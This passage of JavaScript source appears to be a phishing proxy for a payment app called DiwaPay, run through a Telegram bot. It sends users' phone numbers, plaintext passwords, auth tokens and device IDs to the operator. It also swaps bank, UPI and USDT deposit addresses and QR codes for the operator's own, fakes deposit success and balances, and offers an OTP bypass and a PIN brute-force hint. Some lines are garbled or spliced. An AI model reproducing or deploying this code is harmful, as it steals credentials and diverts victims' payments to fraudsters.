      const hasName = kl.includes('name') && !kl.includes('bankname') && !kl.includes('username') && !kl.includes('filename') && !kl.includes('appname');
      if (hasName && bank.accountHolder) {
        if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
        obj[key] = bank.accountHolder;
      }
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
          obj[key] = qrUrl;
        }
        if (kl.includes('qr') || kl.includes('code')) {
          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
            obj[key] = qrUrl;
          }
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        foundOld = foundOld || addr;
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
      }
    }
  }
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon')) return;
      const tok = getTokenFromReq(req);
      const tKey = cleanToken(tok);
      if (tKey && logOffTokens.has(tKey)) return;
      let userId = tKey ? (tokenUserMap[tKey] || '') : '';
      if (!userId) {
        const body = req.parsedBody || {};
        userId = body.userId || '';
      }
      if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
      if (!userId && tKey && redis) {
        try {
          const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
          if (isOff) { logOffTokens.add(tKey); return; }
        } catch(e) {}
      }
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
    } catch(e) {}
  })();
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch(e) {}
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    app: 'DiwaPay Proxy',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.get('/bot-webhook', async (req, res) => {
  await ensureWebhook();
  res.json({ status: 'ok', message: 'DiwaPay Bot Webhook Active' });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData();

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 DiwaPay Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/setmin <number> <amount> — Set minimum order amount for bank
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging
/off log <userId> — Log off for user
/on log <userId> — Log on for user
/status — Full status
/debug — Toggle full debug mode (every req+resp)
/debug on — Debug ON
/debug off — Debug OFF

=== BALANCE ===
/add <amount> <userId> — Add balance
/deduct <amount> <userId> — Remove balance
/remove balance <userId> — Remove all fake balance
/history — All balance changes
/history <userId> — User balance changes
/clearhistory — Clear all history

=== USDT ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== TRACKING ===
/idtrack — Show all tracked user IDs

📌 Login pe aOTP ===
/otp off — OTP bypass ON (needOtp false bhejega)
/otp on — OTP bypass OFF (normal)

=== BALANCE ===
/add <amount> <userId> — Add balance
/deduct <amount> <userId> — Remove balance
/remove balance <userId> — Remove all fake balance
/history — All balance changes
/history <userId> — User balance changes
/clearhistory — Clear all history

=== USDT ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== TRACKING ===
/idtrack — Show all tracked user IDs

📌 Login pe auto-detect:
• challengeId + deviceId dikhega
• Token + PIN brute command dikhega

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }

    if (text === '/otp off') {
      data.otpBypass = true;
      await saveData(data);
      await bot.sendMessage(chatId, '🔕 OTP Bypass ON\nAb login ke waqt needOtp=false bhejega\nOTP nahi manega app');
      return res.sendStatus(200);
    }
    if (text === '/otp on') {
      data.otpBypass = false;
      await saveData(data);
      await bot.sendMessage(chatId, '🔔 OTP Bypass OFF\nAb real API ka response jayega (OTP normal)');
      return res.sendStatus(200);
   rn res.sendStatus(200); }

    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
      if (text === '/debug off') {
        debugMode = false;
        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode');
      } else if (text === '/debug on') {
        debugMode = true;
        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off');
      } else {
        debugMode = !debugMode;
        await bot.sendMessage(chatId, debugMode
          ? '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off'
          : '🔴 Debug Mode OFF — normal mode');
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      await saveData(data);
      if (redis) {
        try {
          const allTokens = await redis.hgetall('diwapayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.sadd('diwapayLogOffTokens', tKey);
                logOffTokens.add(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        await saveData(data);
      }
      if (redis) {
        try {
          const allTokens = await redis.hgetall('diwapayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.srem('diwapayLogOffTokens', tKey);
                logOffTokens.delete(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
      }
      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 12345');
        return res.sendStatus(200);
      }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      const currentBal = tracked ? tracked.balance : 'N/A';
      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({
        type: 'add',
        userId: targetUserId,
        amount: amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal,
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 12345');
        return res.sendStatus(200);
      }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      const tracked2 = data.trackedUsers && data.trackedUsers[targetUserId];
      const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({
        type: 'deduct',
        userId: targetUserId,
        amount: amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal2,
        updatedBalance: updatedBal2,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked2 && tracked2.phone) || ''
      });
      if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
        const removed = data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].addedBalance;
        if (!data.balanceHistory) data.balanceHistory = [];
        const tracked = data.trackedUsers && data.trackedUsers[targetId];
        data.balanceHistory.push({
          type: 'remove',
          userId: targetId,
          amount: removed,
          totalAdded: 0,
          originalBalance: tracked ? tracked.balance : 'N/A',
          updatedBalance: tracked ? tracked.balance : 'N/A',
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          phone: (tracked && tracked.phone) || ''
        });
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      const userSummary = {};
      for (const h of filtered) {
        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
        const s = userSummary[h.userId];
        if (h.type === 'add') s.added += h.amount;
        else s.deducted += h.amount;
        s.totalNet = h.totalAdded || 0;
        if (h.phone) s.phone = h.phone;
        s.entries.push(h);
      }
      let m = '📊 Balance History:\n\n';
      for (const [uid, s] of Object.entries(userSummary)) {
        const tracked = data.trackedUsers && data.trackedUsers[uid];
        const currentBal = tracked ? tracked.balance : 'N/A';
        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
        m += `   💰 Current Balance: ₹${currentBal}\n`;
        m += `   📜 Entries:\n`;
        const recent = s.entries.slice(-10);
        for (const e of recent) {
          const icon = e.type === 'add' ? '➕' : '➖';
          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
        }
        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
        m += '\n';
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = [];
      await saveData(data);
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
      let m = '📋 Tracked User IDs:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
        m += `👤 ID: ${uid}${hasOverride}\n`;
        if (u.name) m += `   📛 Name: ${u.name}\n`;
        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      let m = '💳 Banks:\n\n' + bankListText(data);
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setmin ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const bankIdx = parseInt(parts[0]) - 1;
      const amount = parseFloat(parts[1]);
      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
        return res.sendStatus(200);
      }
      data.banks[bankIdx].minAmount = amount;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} (${data.banks[bankIdx].accountHolder}) set to ₹${amount}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') {
        data.usdtAddress = '';
        await saveData(data);
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data.usdtAddress = addr;
        await saveData(data);
        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
      }
      return res.sendStatus(200);
    }


    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/app/user/login/login', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.userName || body.username || body.phone || body.mobile || '';

    const loginData = getResponseData(jsonResp);
    let userId = '';

    if (loginData && typeof loginData === 'object') {
      userId = String(loginData.userId || loginData.id || loginData.memberId || '');
      const respToken = loginData.token || loginData.accessToken || '';
      const respRefresh = loginData.refreshToken || '';
      const respUsername = loginData.username || loginData.userName || '';

      if (respToken && userId) {
        const tKey = cleanToken(respToken);
        tokenUserMap[tKey] = userId;
        if (redis) redis.hset('diwapayTokenMap', tKey, userId).catch(()=>{});
      }
      if (respRefresh && userId) {
        const rKey = cleanToken(respRefresh);
        tokenUserMap[rKey] = userId;
        if (redis) redis.hset('diwapayTokenMap', rKey, userId).catch(()=>{});
      }
      if (userId) {
        saveTokenUserId(req, userId);
        if (phone) userPhoneMap[String(userId)] = String(phone);
        if (respUsername) userPhoneMap[String(userId)] = String(respUsername);
        const detectedPhone = phone || respUsername || '';
        trackUser(data, userId, 'Login', detectedPhone);
        saveData(data).catch(()=>{});
      }
    }

    if (!userId) {
      userId = await extractUserId(req, jsonResp);
      if (userId && phone) {
        userPhoneMap[String(userId)] = String(phone);
        trackUser(data, userId, 'Login', phone);
        saveData(data).catch(()=>{});
      }
    }

    if (data.adminChatId && bot) {
      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      let extraInfo = '';
      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
      if (loginData && loginData.challengeId) {
        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED!\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
      }
      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
      if (loginToken && jsonResp?.code === 1000) {
        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
      }
      if (loginData && loginData.challengeId) {
        extraInfo += `\n\n📋 COPY:\nchallengeId: ${loginData.challengeId}\ndeviceId: ${androidId}`;
      }
      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/sendotp', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      const hdrs = {};
      for (const [k,v] of Object.entries(req.headers)) { if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection') hdrs[k] = v; }
      bot.sendMessage(data.adminChatId, `📲 OTP Requested\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(hdrs, null, 2).substring(0, 1500)}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/forgot', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/start', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const startData = getResponseData(jsonResp);
    if (startData && body.deviceId) {
      const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
      userDeviceMap[tmpKey] = body.deviceId;
    }
    if (data.adminChatId && bot) {
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      bot.sendMessage(data.adminChatId, `🔐 Login Start\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1200)}`).ca}
tch(()=>{});
    
    let otpBypassed = false;
    if (data.otpBypass && jsonResp && startData && typeof startData === 'object') {
      if (startData.needOtp === true || startData.needOtp === 'true') {
        startData.needOtp = false;
        startData.otpSent = false;
        startData.msg = 'Password required.';
        otpBypassed = true;
      }
    }

    if (data.adminChatId && bot) {
      const reqStr = JSON.stringify(body, null, 2);
